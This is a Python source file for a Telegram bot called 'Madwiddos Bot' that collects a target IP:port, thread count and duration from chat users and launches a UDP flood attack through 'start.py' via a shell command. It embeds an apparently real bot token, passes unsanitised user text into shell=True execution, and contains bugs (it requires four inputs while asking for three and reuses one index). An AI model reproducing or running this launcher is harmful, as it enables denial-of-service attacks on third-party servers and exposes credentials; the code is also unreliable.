import telebot
import subprocess

# Replace 'YOUR_API_KEY' with your actual bot token
API_TOKEN = '7129718094:AAGAX62hkUEwAhbS9O3vm9HJmAOSwap6kQY'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the Madwiddos Bot! Please use the command /run to start.")

@bot.message_handler(commands=['run'])
def handle_run(message):
    msg = bot.reply_to(message, "Please provide the following inputs separated by spaces:1. IP:Port\n2. Thread\n3. Time")
    bot.register_next_step_handler(msg, process_inputs)

def process_inputs(message):
    try:
        inputs = message.text.split()
        if len(inputs) != 4:
            raise ValueError("Invalid number of inputs.")

        ip_port = inputs[0]
        thread = inputs[2]
        time = inputs[2]

        # Example command execution, adjust as necessary
        command = f"python start.py udp {ip_port} {thread} {time}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, f"Command executed successfully:\n{output.decode('utf-8')}")
        else:
            bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")

    except Exception as e:
        bot.reply_to(message, f"Error processing inputs: {str(e)}")

bot.polling()
